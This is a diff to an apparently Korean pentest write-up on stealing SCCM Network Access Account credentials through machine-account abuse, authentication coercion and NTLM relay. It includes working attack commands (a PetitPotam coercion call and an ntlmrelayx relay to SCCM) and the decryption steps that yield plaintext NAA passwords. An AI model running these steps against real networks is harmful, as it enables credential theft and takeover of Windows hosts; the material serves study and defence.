@@ -21,7 +21,7 @@ SCCM에는 NAA라는 계정이 존재한다. 클라이언트들은 SCCM 서버 �
 2. SCCM 서버가 NAA 를 사용하도록 설정
 3. 공격자가 머신 계정을 생성할 수 있도록 MachineAccountQuota 가 0 이상이거나, Authentication Coercion 공격 가능
 
-위 조건들이 맞는 다면 공격자는 만들어놨던 머신 계정을 이용하거나 Authentication Coercion을 이용해 SCCM 서버에 머신 계정으로 접근한 뒤, 가짜 디바이스를 생성하고 SCCM 서버에 등록한 다음, 서버가 배포하는 `NAAConfig.xml` 에서 `NAAPolicy.xml` 을 받아온다. 그 뒤, 자신의 Self-Signed Certificate  RSA 공개키에서 도출한 키를 사용해 NAA 계정 정보를 복호화 한 뒤, 윈도우의 기본 DLL 파일인 `PolicyAgent.dll` 을 이용해 NAA 계정 정보를 역난독화 한 뒤 NAA 의 평문 유저 이름과 비밀번호를 알아낼 수 있다.
+위 조건들이 맞는 다면 공격자는 만들어놨던 머신 계정을 이용하거나 Authentication Coercion을 이용해 SCCM 서버에 머신 계정으로 접근한 뒤, 가짜 디바이스를 생성하고 SCCM 서버에 등록한 다음, 서버가 배포하는 `NAAConfig.xml` 에서 `NAAPolicy.xml` 을 받아온다. 그 뒤, 자신의 Self-Signed Certificate RSA 공개키에서 도출한 키를 사용해 NAA 계정 정보를 복호화 한 뒤, 윈도우의 기본 DLL 파일인 `PolicyAgent.dll` 을 이용해 NAA 계정 정보를 역난독화 한 뒤 NAA 의 평문 유저 이름과 비밀번호를 알아낼 수 있다.
 
 NAA 계정의 경우 네트워크 내 호스트들에 접근한 뒤 패키지들을 설치하거나 패치를 진행하는 등의 일을 해야하기 때문에 로컬 관리자 권한을 갖고 있는 경우가 많다. 즉, NAA 계정 정보만 성공적으로 얻어낼 수 있다면 공격자는 순식간에 네트워크 내의 모든 윈도우 호스트들을 장악할 수 있게 된다.
 
@@ -71,7 +71,7 @@ python3 petitpotam.py -u <u> -p <p> <attackerIP> <targetIP>
 # SCCM 서버를 향해 SCCM Relay 
 - ThePorgs 포크 버전 사용 (https://github.com/ThePorgs/impacket) 
 
-ntlmrelayx.py -t http://<server>/ccm_system_windowsauth/request --sccm --sccm-device fake-device --sccm-fqdn domain.com --http-port 80 --sccm-server sccm --sccm-sleep 10
+ntlmrelayx.py -t http://<server>/ccm_system_windowsauth/request --sccm --sccm-device fake-device --sccm-fqdn domain.com --http-port 80 --sccm-server sccm --sccm-sleep 10 -smb2support 
 
 # NAAPolicy.xml 받은 뒤 Post-Ex 단계로 진행 
 ```
@@ -98,4 +98,3 @@ Password123!
 * https://github.com/ThePorgs/impacket/pull/14
 * https://www.thehacker.recipes/ad/movement/sccm-mecm
 * https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
-
